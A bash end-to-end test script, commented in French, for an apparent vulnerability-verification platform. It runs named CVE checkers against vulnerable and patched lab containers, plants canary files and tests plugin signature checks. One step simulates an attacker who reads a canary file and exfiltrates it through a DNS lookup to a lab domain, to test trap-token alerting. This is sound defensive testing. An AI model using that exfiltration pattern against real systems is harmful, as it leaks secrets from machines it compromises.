#!/usr/bin/env bash
# Scénario de bout en bout des plugins contre le labo (lab/compose.yaml) :
# installation des plugins officiels signés, refus d'un plugin altéré, canari fichier,
# exploitation bornée au canari, callback DNS, empreinte TCP, alerte de jeton piège.
set -euo pipefail
cd "$(dirname "$0")/.."
API="${API:-http://127.0.0.1:8095}"
EMAIL="${EMAIL:-admin@lab.test}"
PASSWORD="${PASSWORD:-labo-opencvec-2026}"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT
COMPOSE="docker compose -f lab/compose.yaml"

call() { curl -sS -b "$JAR" -c "$JAR" -X "$1" -H 'X-OpenCVEC: 1' -H 'Content-Type: application/json' ${3:+--data "$3"} "$API$2"; }

echo "· attente des cibles"
for url in http://172.30.0.50/ http://172.30.0.51/ http://172.30.0.60:8080/ http://172.30.0.80/ http://172.30.0.81/ ; do
  for _ in $(seq 1 60); do
    docker run --rm --network opencvec-lab_lab curlimages/curl:8.11.1 -s -o /dev/null --max-time 3 "$url" && break
    sleep 3
  done
done

wp_install() { # ip : installe WordPress (idempotent), mot de passe admin jetable
  local pw
  docker run --rm --network opencvec-lab_lab curlimages/curl:8.11.1 -s --max-time 10 "http://$1/" | grep -q 'name="generator"' && return
  pw=$(openssl rand -hex 12)
  docker run --rm --network opencvec-lab_lab curlimages/curl:8.11.1 -s -o /dev/null --max-time 60 -X POST "http://$1/wp-admin/install.php?step=2" \
    --data-urlencode "weblog_title=Labo OpenCVEC" --data-urlencode "user_name=labo" --data-urlencode "admin_password=$pw" \
    --data-urlencode "admin_password2=$pw" --data-urlencode "pw_weak=1" --data-urlencode "admin_email=labo@lab.test" \
    --data-urlencode "blog_public=0" --data-urlencode "language=" -d "Submit=Install"
}
echo "· installation des WordPress du labo"
wp_install 172.30.0.80; wp_install 172.30.0.81

call POST /api/login "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}" >/dev/null
call POST /api/allowlist '{"cidr":"172.30.0.0/24","reason":"labo OpenCVEC isolé","review_days":30}' >/dev/null || true

echo "· installation des plugins officiels (signés)"
for f in plugins/*.yaml; do
  body=$(jq -n --rawfile c "$f" --rawfile s "$f.sig" '{content:$c, signature:$s}')
  printf '  %-48s %s\n' "$(basename "$f")" "$(call POST /api/plugins "$body")"
done
echo "· plugin altéré après signature (attendu : refus)"
f=plugins/regresshion-cve-2024-6387.yaml
body=$(jq -n --rawfile c "$f" --rawfile s "$f.sig" '{content:($c + "\n# modifié"), signature:$s}')
echo "  $(call POST /api/plugins "$body")"

asset() { # hôte port → id (preuve par liste blanche)
  local id
  id=$(call GET /api/assets | jq -r --arg h "$1" '.[] | select(.host==$h) | .id')
  [ -n "$id" ] || id=$(call POST /api/assets "{\"host\":\"$1\",\"proof_method\":\"allowlist\",\"scheme\":\"http\",\"port\":$2}" | jq -r .id)
  [ "$(call POST "/api/assets/$id/verify" | jq -r .owned)" = "true" ] || { echo "preuve refusée pour $1" >&2; exit 1; }
  echo "$id"
}

deploy_canary() { # service id_asset
  local tok
  tok=$(call POST "/api/assets/$2/canary" '{"path":"/opt/opencvec/canary.txt"}' | jq -r .token)
  $COMPOSE exec -T "$1" sh -c "mkdir -p /opt/opencvec && printf '%s\n' $tok > /opt/opencvec/canary.txt && chmod 644 /opt/opencvec/canary.txt"
  echo "  canari déposé sur $1"
}

echo "· canaris fichier"
A50=$(asset 172.30.0.50 80); A51=$(asset 172.30.0.51 80)
deploy_canary httpd "$A50"; deploy_canary httpd-patched "$A51"

FAILED=0
declare -a LABELS CIDS EXPECTED
launch() { # libellé hôte port url checker attendu
  local id cid
  id=$(asset "$2" "$3")
  cid=$(call POST /api/campaigns "{\"asset_id\":$id,\"target_url\":\"$4\",\"checkers\":[\"$5\"]}" | jq -r .id)
  LABELS+=("$1"); CIDS+=("$cid"); EXPECTED+=("$6")
}
echo "· campagnes"
launch "ApacheTraversal / httpd 2.4.49"   172.30.0.50 80   "http://172.30.0.50/"      apache-traversal-41773 proved
launch "ApacheTraversal / httpd 2.4.51"   172.30.0.51 80   "http://172.30.0.51/"      apache-traversal-41773 inconclusive
launch "SpringFunction / SCF 3.2.2"       172.30.0.60 8080 "http://172.30.0.60:8080/" spring-function-22963  proved
launch "RegreSSHion / OpenSSH 9.6p1"      172.30.0.70 22   "http://172.30.0.70:22/"   regresshion-6387       probable
launch "RegreSSHion / OpenSSH 9.9p2"      172.30.0.71 22   "http://172.30.0.71:22/"   regresshion-6387       patched
launch "WP2Shell / WordPress 6.9.4"       172.30.0.80 80   "http://172.30.0.80/"      wp2shell               probable
launch "WP2Shell / WordPress 7.0.2"       172.30.0.81 80   "http://172.30.0.81/"      wp2shell               patched

for i in "${!CIDS[@]}"; do
  for _ in $(seq 1 300); do
    [ "$(call GET "/api/campaigns/${CIDS[$i]}" | jq -r .pending)" = "0" ] && break
    sleep 2
  done
  c=$(call GET "/api/campaigns/${CIDS[$i]}")
  v=$(jq -r '.checks[0].verdict' <<<"$c"); s=$(jq -r '.checks[0].summary' <<<"$c")
  if [ "$v" = "${EXPECTED[$i]}" ]; then printf '  OK    %-34s %-13s %s\n' "${LABELS[$i]}" "$v" "${s:0:130}"
  else printf '  ÉCHEC %-34s %-13s (attendu %s) %s\n' "${LABELS[$i]}" "$v" "${EXPECTED[$i]}" "$s"; FAILED=1; fi
done

echo "· intrusion simulée : un attaquant lit le canari de httpd et l'exfiltre par DNS (hors check)"
$COMPOSE exec -T httpd sh -c 'getent hosts "$(cat /opt/opencvec/canary.txt).c.opencvec.lab" >/dev/null || true'
sleep 2
alerts=$(call GET '/api/callbacks?status=alerts' | jq 'length')
if [ "$alerts" -ge 1 ]; then echo "  OK    alerte de jeton piège levée ($alerts)"; else echo "  ÉCHEC aucune alerte"; FAILED=1; fi
echo "· intégrité du journal d'audit : $(call GET /api/audit/verify)"
exit "$FAILED"
